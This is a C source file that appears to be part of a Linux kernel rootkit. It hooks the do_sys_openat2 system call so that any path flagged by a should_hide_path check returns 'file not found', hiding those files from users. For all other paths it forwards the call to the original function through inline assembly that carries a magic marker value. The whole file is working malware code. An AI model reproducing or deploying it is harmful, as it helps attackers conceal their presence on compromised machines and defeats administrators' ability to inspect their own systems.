#include "../inc/cmds.h"
#include "../inc/hooks.h"
#include "../inc/util.h"

#include <linux/fs_struct.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/openat2.h>
#include <linux/slab.h>

void *_do_sys_openat2 = NULL;

asmlinkage int64_t h_do_sys_openat2(int dfd, const char __user *filename, struct open_how *how) {
  int64_t     ret = 0;
  struct path path;

  hfind(_do_sys_openat2, "do_sys_openat2");

  // this call will only fail if the path does not exist
  if (user_path_at(dfd, filename, LOOKUP_FOLLOW, &path) != 0)
    goto end;

  if (should_hide_path(&path))
    ret = -ENOENT;

end:
  if (ret == 0)
    asm("mov %1, %%r15;"
        "mov %2, %%edi;"
        "mov %3, %%rsi;"
        "mov %4, %%rdx;"
        "call *%5;"
        "mov %%rax, %0;"
        : "=m"(ret)
        : "i"(SHRK_MAGIC_R15), "r"(dfd), "r"(filename), "r"(how), "m"(_do_sys_openat2)
        : "%r15", "%rdi", "%rsi", "%rdx", "%rax");

  return ret;
}
